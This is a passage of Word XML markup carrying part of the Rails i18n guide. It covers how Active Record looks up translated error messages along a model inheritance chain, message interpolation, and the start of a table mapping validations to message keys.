          <w:p w14:paraId="45FCB833" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.messages.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B334849" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.attributes.name.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4968BE22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.messages.blank</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55167551" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When your models are additionally using inheritance then the messages are looked up in the inheritance chain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599F7A11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, you might have an Admin model inheriting from User:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4488"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4EA8A38D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="561ACF9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Admin &lt; User</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D9BBA63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  validates :name, :presence</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A4A4793" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36972733" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Then Active Record will look for messages in this order:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="605097CD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FC7943C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.admin.attributes.name.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="068EB14B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.admin.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B344883" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.user.attributes.name.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FCEA142" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.models.user.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="050D2863" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activerecord.errors.messages.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64D31569" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.attributes.name.blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10E946DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>errors.messages.blank</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EDC758F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This way you can provide special translations for various error messages at different points in your models inheritance chain and in the attributes, models, or default scopes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A969982" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.2 Error Message Interpolation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8BF0A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The translated model name, translated attribute name, and value are always available for interpolation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199C5478" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">So, for example, instead of the default error message </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"can not be blank"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you could use the attribute name like this : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"Please fill in your %{attribute}"</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D61479A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="298"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r>
        <w:t>, where available, can be used for pluralization if present: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9"/>
        <w:gridCol w:w="2391"/>
        <w:gridCol w:w="2391"/>
        <w:gridCol w:w="1224"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="37891109" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3804A7C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">validation </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25A5460D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">with option </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="507D2282" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">message </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BA1C17F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>interpolation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="52A096E7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="205F4F54" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">confirmation </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="037300D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DF30759" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:confirmation </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F6DCEBB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="1DE861C0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75C9F3E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">acceptance </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F9E0861" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CB46501" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:accepted </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F93A331" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="675BA354" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76FAB925" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">presence </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B9DBBB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D369439" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:blank </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71E13282" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="54E669D4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4195C254" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="294CF12D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:within, :in </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07CD0AF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:too_short </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="602A615F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="74CF9F41" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2676CE92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36DF87BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:within, :in </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38672930" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:too_long </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68A3F3DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="172286CC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C1D7A5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71EC6ECB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:is </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16634B3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:wrong_length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A4A8022" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="75853660" w14:textId="77777777" w:rsidTr="009A002D">
